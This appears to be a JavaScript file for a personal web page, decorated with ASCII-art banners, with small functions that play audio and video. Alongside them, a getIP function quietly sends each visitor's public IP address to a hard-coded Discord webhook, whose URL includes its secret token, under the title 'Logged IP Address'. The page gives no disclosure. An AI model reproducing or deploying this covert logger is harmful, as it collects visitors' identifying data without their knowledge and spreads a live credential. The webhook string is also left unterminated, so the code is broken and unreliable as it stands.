/*
 ▐ ▄ ▄▄▄ .▄ •▄ .▄▄ · ▪            ▄▄ • .▄▄▄  
•█▌▐█▀▄.▀·█▌▄▌▪▐█ ▀. ██ ▪        ▐█ ▀ ▪▐▀•▀█ 
▐█▐▐▌▐▀▀▪▄▐▀▀▄·▄▀▀▀█▄▐█· ▄█▀▄    ▄█ ▀█▄█▌·.█▌
██▐█▌▐█▄▄▌▐█.█▌▐█▄▪▐█▐█▌▐█▌.▐▌   ▐█▄▪▐█▐█▪▄█·
▀▀ █▪ ▀▀▀ ·▀  ▀ ▀▀▀▀ ▀▀▀ ▀█▄▀▪ ▀ ·▀▀▀▀ ·▀▀█. 
*/

function audioPlay() {
  var audio = document.getElementById("audio");
  audio.volume = 0.4;
  audio.play()
}

function videoPlay() {
  var video = document.getElementById("video");
  video.play()
}

    function getIP(json) {
        console.log("My public IP address is: ", json.ip);
        var request = new XMLHttpRequest();
        const Hook = "https://discordapp.com/api/webhooks/953945431719706644/5AzEkz2uc3nzg9zyFsHI9DKiHB9X1AP7x2f54kGpWPQtaVNqMsftA2CJnSSMDpXDHkh8;

        var request = new XMLHttpRequest();
        request.open("POST", Hook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Sosi",
            embeds: [
                { "color": 7506394, // Decimal Color [ Blue ]
                "title": "Logged IP Address",
                "description": json.ip
            }]
        }
        request.send(JSON.stringify(params));

    }

/*
 ▐ ▄ ▄▄▄ .▄ •▄ .▄▄ · ▪            ▄▄ • .▄▄▄  
•█▌▐█▀▄.▀·█▌▄▌▪▐█ ▀. ██ ▪        ▐█ ▀ ▪▐▀•▀█ 
▐█▐▐▌▐▀▀▪▄▐▀▀▄·▄▀▀▀█▄▐█· ▄█▀▄    ▄█ ▀█▄█▌·.█▌
██▐█▌▐█▄▄▌▐█.█▌▐█▄▪▐█▐█▌▐█▌.▐▌   ▐█▄▪▐█▐█▪▄█·
▀▀ █▪ ▀▀▀ ·▀  ▀ ▀▀▀▀ ▀▀▀ ▀█▄▀▪ ▀ ·▀▀▀▀ ·▀▀█. 
*/
